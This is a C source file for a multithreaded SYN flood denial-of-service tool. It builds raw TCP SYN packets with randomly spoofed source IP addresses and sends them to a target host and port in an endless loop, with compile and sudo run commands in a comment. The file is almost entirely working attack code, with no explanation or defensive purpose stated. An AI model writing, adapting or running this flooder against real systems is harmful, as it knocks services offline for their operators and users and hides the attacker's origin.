#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <time.h>
#include <netdb.h>

#define DEFAULT_THREADS 4
#define DEFAULT_PORT 80
#define DEFAULT_DELAY_US 1000
#define MAX_THREADS 1024
#define MAX_DELAY_US 10000000


//gcc synflood_final.c -o synflood -lpthread
//sudo ./synflood 192.168.56.101 80 8 1000


volatile unsigned long long total_packets = 0;

struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

typedef struct {
    struct sockaddr_in sin;
    int delay_us;
} thread_config;

// Function declarations
void *flood_thread(void *arg);
unsigned short checksum(unsigned short *ptr, int nbytes);
void usage(const char *prog);

unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *) &oddbyte) = *(unsigned char *) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short) ~sum;
    return answer;
}

void *flood_thread(void *arg) {
    thread_config *config = (thread_config *)arg;
    struct sockaddr_in sin = config->sin;
    int delay_us = config->delay_us;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket creation failed");
        free(config);
        pthread_exit(NULL);
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt() failed");
        close(sock);
        free(config);
        pthread_exit(NULL);
    }

    char datagram[4096];
    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));
    char pseudo_packet[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
    struct pseudo_header *psh = (struct pseudo_header *) pseudo_packet;

    while (1) {
        memset(datagram, 0, sizeof(datagram));

        // Random spoofed source IP
        char ip_str[16];
        sprintf(ip_str, "%d.%d.%d.%d", rand() % 256, rand() % 256, rand() % 256, rand() % 256);
        unsigned int src_ip = inet_addr(ip_str);

        // Build IP header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->id = htons(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = rand() % 64 + 1;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = src_ip;
        iph->daddr = sin.sin_addr.s_addr;

        // Build TCP header
        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(ntohs(sin.sin_port));
        tcph->seq = rand();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(5840);
        tcph->check = 0;
        tcph->urg_ptr = 0;

        // Fill pseudo-header
        psh->source_address = iph->saddr;
        psh->dest_address = iph->daddr;
        psh->placeholder = 0;
        psh->protocol = IPPROTO_TCP;
        psh->tcp_length = htons(sizeof(struct tcphdr));

        memcpy(pseudo_packet + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
        tcph->check = checksum((unsigned short *) pseudo_packet,
                               sizeof(struct pseudo_header) + sizeof(struct tcphdr));

        iph->check = checksum((unsigned short *) datagram,
                              sizeof(struct iphdr) + sizeof(struct tcphdr));

        if (sendto(sock, datagram, ntohs(iph->tot_len), 0,
                   (struct sockaddr *) &sin, sizeof(sin)) < 0) {
            perror("sendto failed");
        }

        __sync_fetch_and_add(&total_packets, 1);
        if (delay_us > 0) usleep(delay_us);
    }

    close(sock);
    free(config);
    pthread_exit(NULL);
}

void usage(const char *prog) {
    printf("Usage: %s <target_ip_or_domain> [port] [threads] [delay_us]\n", prog);
    printf("Example: %s 192.168.56.101 80 4 1000\n", prog);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        usage(argv[0]);
        return 1;
    }

    char *target = argv[1];
    int port = (argc > 2) ? atoi(argv[2]) : DEFAULT_PORT;
    int threads = (argc > 3) ? atoi(argv[3]) : DEFAULT_THREADS;
    int delay_us = (argc > 4) ? atoi(argv[4]) : DEFAULT_DELAY_US;

    if (port <= 0 || port > 65535) port = DEFAULT_PORT;
    if (threads <= 0 || threads > MAX_THREADS) threads = DEFAULT_THREADS;
    if (delay_us < 0 || delay_us > MAX_DELAY_US) delay_us = DEFAULT_DELAY_US;

    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    struct hostent *he;
    if ((he = gethostbyname(target)) == NULL) {
        perror("gethostbyname");
        return 1;
    }
    memcpy(&sin.sin_addr, he->h_addr, he->h_length);

    srand(time(NULL) ^ getpid());

    pthread_t tids[threads];

    printf("[*] Starting SYN flood: %s:%d using %d threads\n", target, port, threads);

    for (int i = 0; i < threads; i++) {
        thread_config *config = malloc(sizeof(thread_config));
        if (!config) {
            perror("malloc failed");
            return 1;
        }
        config->sin = sin;
        config->delay_us = delay_us;

        if (pthread_create(&tids[i], NULL, flood_thread, (void *)config) != 0) {
            perror("pthread_create failed");
            free(config);
            return 1;
        }
    }

    while (1) {
        sleep(5);
        printf("[+] Packets sent so far: %llu\n", total_packets);
    }

    return 0;
}
